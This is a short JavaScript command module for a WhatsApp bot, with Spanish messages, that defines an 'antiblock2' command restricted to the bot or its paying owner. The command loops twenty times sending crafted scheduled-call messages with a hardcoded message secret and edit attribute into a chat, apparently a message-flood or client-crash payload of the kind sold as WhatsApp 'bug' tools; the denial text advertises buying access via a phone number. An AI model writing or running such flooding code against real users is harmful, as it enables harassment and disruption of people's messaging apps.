let handler = async (m, { conn, args, isBot, isOwner, command }) => {
  if (!isBot && !isOwner) {
    return conn.sendMessage(m.chat, {
      text: `\n ❌ *COMANDO NEGADO, SOLO PUEDE SER USADO POR MI PORTADOR. SI DESEAS ADQUIRIRLO MANDA MENSAJE A: +526421147692*\n`
    }, { quoted: m });
  }

  const link = args[0];
  if (!link) {
    return m.reply('📎 *Debes proporcionar un enlace.*\n\nEjemplo: *.antiblock2 https://example.com*');
  }

  const cantidad = 20; // 🔁 Puedes ajustar la cantidad
  const from = m.chat;

  for (let i = 0; i < cantidad; i++) {
    try {
      await conn.relayMessage(from, {
        messageContextInfo: {
          messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
          deviceListMetaData: {},
          deviceListMetadataVersion: 2
        },
        scheduledCallCreationMessage: {
          scheduledTimestampMs: '1200',
          callType: "AUDIO",
          title: link,
        }
      }, {
        additionalAttributes: { edit: '7' }
      });

      await delay(100); // ⏱️ Pequeño delay para evitar sobrecarga
    } catch (e) {
      console.error(`[ERROR] Falló en el intento ${i + 1}:`, e);
    }
  }

  await m.reply('✅ *Comando ejecutado con éxito.*');
};

handler.command = ['antiblock2'];
handler.owner = false;
handler.bot = true;

export default handler;

// Función de espera
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}